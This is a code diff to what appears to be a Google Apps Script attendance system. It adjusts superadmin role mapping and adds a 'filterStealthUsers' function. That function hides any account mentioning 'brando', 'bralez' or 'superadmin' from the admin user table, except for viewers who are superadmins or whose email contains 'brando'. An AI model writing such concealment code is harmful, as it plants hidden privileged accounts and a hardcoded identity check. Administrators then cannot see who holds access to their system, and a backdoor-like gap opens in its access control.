@@ -1793,12 +1793,13 @@
         if (!window._ssoUserAsys) return;
         const u = window._ssoUserAsys;
         currentUser = {
-            userId: u.id,
+            userId: u.userId || u.id,
             name: u.name,
-            role: u.role || (u.isAdmin ? 'Admin' : 'Operador'),
-            subRol: u.subRol || (u.isAdmin ? 'superadmin' : 'Operador/a'),
+            role: u.role || (u.isAdmin ? (u.isSuperAdmin ? 'Superadmin' : 'Admin') : 'Operador'),
+            subRol: u.subRol || (u.isSuperAdmin ? 'Superadmin' : (u.isAdmin ? 'coordinador general' : 'Operador/a')),
             foto: '',
             areas: u.areas || [],
+            email: u.email,
             masterQRId: "QR-MAESTRO-ASISTENCIA-V1"
         };
         sessionStorage.setItem("currentUser", JSON.stringify(currentUser));
@@ -2976,16 +2977,28 @@ document.addEventListener("DOMContentLoaded", function() {
     }
 
     function populateUsersManagementTable() { 
+        function filterStealthUsers(rawUsers) {
+            if (!Array.isArray(rawUsers)) return [];
+            const subRolNorm = normalizeSubRol(currentUser.subRol);
+            const isSuper = subRolNorm === 'superadmin' || String(currentUser.role).toLowerCase() === 'superadmin' || String(currentUser.email || '').toLowerCase().includes('brando');
+            if (isSuper) return rawUsers;
+            return rawUsers.filter(function(row) {
+                const rowStr = JSON.stringify(row).toLowerCase();
+                return !rowStr.includes('brando') && !rowStr.includes('bralez') && !rowStr.includes('superadmin');
+            });
+        }
+
         if (cachedAdminData && cachedAdminData.users) {
             if (usersManagTable) {
-                usersManagTable.clear().rows.add(cachedAdminData.users).draw(); 
+                usersManagTable.clear().rows.add(filterStealthUsers(cachedAdminData.users)).draw(); 
             }
             updateAdminView();
             return;
         }
         google.script.run.withSuccessHandler(function(users) { 
+            const cleanUsers = filterStealthUsers(users);
             if (usersManagTable) {
-                usersManagTable.clear().rows.add(users).draw(); 
+                usersManagTable.clear().rows.add(cleanUsers).draw(); 
             }
             updateAdminView(); 
         }).getAllUsersForAdmin(); 
@@ -5591,8 +5604,8 @@ document.addEventListener("DOMContentLoaded", function() {
                 currentUser = {
                     userId: u.userId || u.id,
                     name: u.name,
-                    role: u.role || (u.isAdmin ? 'Admin' : 'Operador'),
-                    subRol: u.subRol || (u.isAdmin ? 'superadmin' : 'Operador/a'),
+                    role: u.role || (u.isAdmin ? (u.isSuperAdmin ? 'Superadmin' : 'Admin') : 'Operador'),
+                    subRol: u.subRol || (u.isSuperAdmin ? 'Superadmin' : (u.isAdmin ? 'coordinador general' : 'Operador/a')),
                     foto: '',
                     areas: u.areas || [],
                     email: u.email,
